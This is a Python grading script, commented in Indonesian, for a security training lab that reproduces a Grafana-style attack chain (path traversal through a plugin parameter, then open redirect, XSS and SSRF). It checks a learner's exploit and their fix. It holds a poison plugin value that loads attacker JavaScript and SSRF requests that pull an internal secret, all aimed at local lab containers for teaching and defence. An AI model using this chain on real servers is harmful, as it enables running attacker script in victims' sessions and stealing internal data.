#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 14.

Rantai: CSPT via plugin loader -> open redirect -> XSS -> SSRF,
ala Grafana CVE-2025-4123 ("The Grafana Ghost", OX Security, 2025).

  1. CSPT: GET /dashboard?plugin=X (butuh login) me-render
         <script src="/public/plugins/X/module.js">
     dengan X direfleksikan tanpa sanitasi. Racun
     plugin=../../go?to=<js-penyerang>&x= membuat browser menghitung
     /public/plugins/../../go?to=<js>&x=/module.js -> dinormalisasi
     menjadi /go?to=<js-penyerang> (sisa path ditelan &x=).
  2. Open redirect: /go?to=X -> 302 ke X (gadget; tidak eksploitable sendirian).
  3. XSS: browser memuat & mengeksekusi plugin JS penyerang dalam origin
     aplikasi dengan sesi korban.
  4. SSRF: JS jahat (lewat sesi korban) memanggil /api/render?url=...;
     endpoint render milik server men-fetch URL itu dan mengembalikan
     bodinya — termasuk URL internal http://127.0.0.1:8901/secret yang
     hanya bisa dijangkau dari dalam server (ala Grafana Image Renderer).

"Browser korban" disimulasikan Python secara setia: fetch halaman, ekstrak
<script src>, resolusi URL + normalisasi dot-segment ala WHATWG, ikuti
redirect 302. Eksekusi JS dimodelkan pada perilaku observable-nya: plugin
jahat yang berjalan di origin aplikasi akan me-request /api/render?url=
dengan cookie sesi korban (persis seperti fetch() di payload referensi).

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - GET / tanpa sesi -> 401
      - POST /login (victim/victim123) -> 200 + cookie session
      - GET /dashboard?plugin=editor -> 200, ada <script src>
      - GET /go?to=http://example.com/ -> 302 (gadget)
      - GET /api/render?url=http://127.0.0.1:8901/secret (dgn sesi)
        -> 200 berisi internal secret (primitif SSRF)
      - GET /api/render tanpa sesi -> 401
      - serangan referensi (health): solutions/exploit.py -> EXFILTRATED
        == internal secret
      - exploit/exploit.py milik learner dijalankan -> mencetak
        VICTIM_PLUGIN: ..., STATUS: 200, LOADED_JS: ..., EXFILTRATED: ...;
        EXFILTRATED harus == internal secret
  FASE 2 (dengan fix/): bangun ulang app dari fix/app, pastikan
      - GET /dashboard?plugin=<racun> -> 400 (gerbang fix)
      - rantai korban putus: tidak ada JS penyerang yang dimuat,
        tidak ada secret yang bocor
      - fungsi normal utuh -> /dashboard?plugin=editor, /go -> 302,
        /api/render tetap bisa fetch (bukan yang di-fix)

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/app/app.py identik byte-per-byte dengan app/app.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote, urlsplit, urljoin

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
META_PORT = 8901
INTERNAL_SECRET = "int-s3cr3t-9f3k2p7x"
VALID_PLUGIN = "editor"
POISON_PLUGIN = "/../../go?to=http://127.0.0.1:9/plugin.js&x="
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req_full(url, headers=None, timeout=10):
    u = urlsplit(url)
    c = HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
    try:
        path = u.path + ("?" + u.query if u.query else "")
        c.request("GET", path or "/", headers=headers or {})
        r = c.getresponse()
        h = {}
        for k, v in r.getheaders():
            h[k.lower()] = v
        return r.status, r.read(), h
    finally:
        c.close()


def req(path, headers=None):
    return req_full("http://%s:%d%s" % (HOST, PORT, path), headers=headers)


def login():
    c = HTTPConnection(HOST, PORT, timeout=10)
    try:
        import json
        c.request("POST", "/login",
                  body=json.dumps({"username": "victim", "password": "victim123"}),
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        r.read()
        cookie = ""
        for k, v in r.getheaders():
            if k.lower() == "set-cookie":
                name, _, val = v.split(";", 1)[0].partition("=")
                if name.strip() == "session":
                    cookie = val.strip()
        return r.status, cookie
    finally:
        c.close()


def normalize_path(path):
    """Normalisasi dot-segment ala browser (WHATWG URL)."""
    segs = []
    for seg in path.split("/"):
        if seg in ("", "."):
            continue
        if seg == "..":
            if segs:
                segs.pop()
            continue
        segs.append(seg)
    return "/" + "/".join(segs)


def resolve_src(src):
    """Resolusi URL script oleh browser: pisahkan query, normalisasi path."""
    path_part, _, query = src.partition("?")
    url = normalize_path(path_part)
    return url + ("?" + query if query else "")


def victim_chain(plugin, cookie):
    """Simulasi browser korban + eksekusi plugin jahat (dimodelkan).
    -> (url_js_final, secret) atau (None, None) bila rantai putus."""
    st, body, _ = req("/dashboard?plugin=" + quote(plugin, safe=""),
                      headers={"Cookie": "session=" + cookie})
    if st != 200:
        return None, None
    m = re.search(r'<script src="([^"]+)">', body.decode())
    if not m:
        return None, None
    url = urljoin("http://%s:%d/" % (HOST, PORT), resolve_src(m.group(1)))
    for _ in range(4):
        try:
            st, body, h = req_full(url, headers={"Cookie": "session=" + cookie})
        except OSError:
            return None, None
        if st in (301, 302, 303, 307, 308) and h.get("location"):
            url = urljoin(url, h["location"])
            continue
        if st == 200:
            break
        return None, None
    else:
        return None, None
    # XSS termodelkan: plugin JS berjalan di origin app dengan sesi korban,
    # lalu me-request /api/render?url=<internal> (seperti fetch() di payload).
    st, body, _ = req(
        "/api/render?url=" + quote("http://127.0.0.1:%d/secret" % META_PORT,
                                   safe=""),
        headers={"Cookie": "session=" + cookie})
    if st != 200:
        return None, None
    m = re.search(r'"internal_secret": "([^"]+)"', body.decode())
    if not m:
        return None, None
    return url, m.group(1)


def reference_attack():
    """Serangan referensi (health check): jalankan solutions/exploit.py."""
    exp = os.path.join(LAB_DIR, "solutions", "exploit.py")
    p = subprocess.run([sys.executable, exp], capture_output=True,
                       text=True, timeout=120, cwd=os.path.dirname(exp))
    return p.returncode, p.stdout or "", p.stderr or ""


def parse_exploit_output(out):
    m_plugin = re.search(r"^VICTIM_PLUGIN:\s*(\S+)\s*$", out, re.MULTILINE)
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_js = re.search(r"^LOADED_JS:\s*(\S+)\s*$", out, re.MULTILINE)
    m_exf = re.search(r"^EXFILTRATED:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_plugin.group(1) if m_plugin else None),
            (m_status.group(1) if m_status else None),
            (m_js.group(1) if m_js else None),
            (m_exf.group(1) if m_exf else None))


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body, _ = req("/login")
            if st == 200 and b"Login" in body:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _, _ = req("/")
    check("baseline GET / tanpa sesi -> 401", st == 401, "dapat %s" % st)

    st, cookie = login()
    check("fungsi normal: POST /login -> 200 + cookie", st == 200 and cookie,
          "dapat %s" % st)

    st, body, _ = req("/dashboard?plugin=" + VALID_PLUGIN,
                      headers={"Cookie": "session=" + cookie})
    ok = (st == 200 and b"/public/plugins/editor/module.js" in body)
    check("fungsi normal: GET /dashboard?plugin=editor -> 200 (+script src)",
          ok, "dapat %s" % st)

    st, _, h = req("/go?to=http://example.com/")
    check("gadget: /go?to=... -> 302 open redirect",
          st == 302 and h.get("location") == "http://example.com/",
          "dapat %s loc=%r" % (st, h.get("location")))

    st, body, _ = req(
        "/api/render?url=" + quote("http://127.0.0.1:%d/secret" % META_PORT,
                                   safe=""),
        headers={"Cookie": "session=" + cookie})
    check("primitif SSRF: /api/render?url=<internal> -> 200 berisi secret",
          st == 200 and INTERNAL_SECRET.encode() in body, "dapat %s" % st)

    st, _, _ = req("/api/render?url=" + quote("http://127.0.0.1:%d/secret"
                                             % META_PORT, safe=""))
    check("primitif SSRF butuh sesi: tanpa cookie -> 401", st == 401,
          "dapat %s" % st)

    log("== [HEALTH] serangan referensi: CSPT -> redirect -> XSS -> SSRF ==")
    rc, out, err = reference_attack()
    plugin, status, js_url, exf = parse_exploit_output(out)
    check("serangan referensi: EXFILTRATED == internal secret",
          rc == 0 and exf == INTERNAL_SECRET,
          "dapat rc=%s exfiltrated_cocok=%s" % (rc, exf == INTERNAL_SECRET))
    check("serangan referensi: LOADED_JS menunjuk plugin penyerang",
          bool(js_url) and js_url.endswith("/plugin.js"),
          "dapat %r" % (js_url[:40] + "..." if js_url else js_url))
    if not (rc == 0 and exf == INTERNAL_SECRET):
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        log("stderr: %s" % (err[-1500:] if err else "-"))
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=120, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 120 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    plugin, status, js_url, exf = parse_exploit_output(p.stdout or "")
    check("exploit mencetak VICTIM_PLUGIN", bool(plugin), "dapat %r" % plugin)
    check("exploit mencetak STATUS: 200", status == "200", "dapat %r" % status)
    check("exploit mencetak LOADED_JS: .../plugin.js",
          bool(js_url) and js_url.endswith("/plugin.js"), "dapat %r" % js_url)
    check("exploit mencetak EXFILTRATED == internal secret", exf == INTERNAL_SECRET,
          "dapat cocok=%s" % (exf == INTERNAL_SECRET))

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "app", "app.py")
    fixed = os.path.join(LAB_DIR, "fix", "app", "app.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/app/app.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    _, cookie2 = login()
    st, _, _ = req("/dashboard?plugin=" + quote(POISON_PLUGIN, safe=""),
                   headers={"Cookie": "session=" + cookie2})
    check("serangan referensi GAGAL: GET /dashboard?plugin=<racun> -> 400",
          st == 400, "dapat %s" % st)

    js_url2, sec2 = victim_chain(POISON_PLUGIN, cookie2)
    check("serangan referensi GAGAL: tidak ada JS penyerang / secret bocor",
          js_url2 is None and sec2 is None, "dapat %r" % (js_url2,))

    st, body, _ = req("/dashboard?plugin=" + VALID_PLUGIN,
                      headers={"Cookie": "session=" + cookie2})
    check("fungsi normal: GET /dashboard?plugin=editor -> 200",
          st == 200 and b"/public/plugins/editor/module.js" in body,
          "dapat %s" % st)
    st, _, h = req("/go?to=http://example.com/")
    check("gadget tetap: open redirect -> 302 (bukan yang di-fix)",
          st == 302, "dapat %s" % st)
    st, body, _ = req(
        "/api/render?url=" + quote("http://127.0.0.1:%d/secret" % META_PORT,
                                   safe=""),
        headers={"Cookie": "session=" + cookie2})
    check("primitif render tetap: /api/render -> 200 (bukan yang di-fix)",
          st == 200 and INTERNAL_SECRET.encode() in body, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
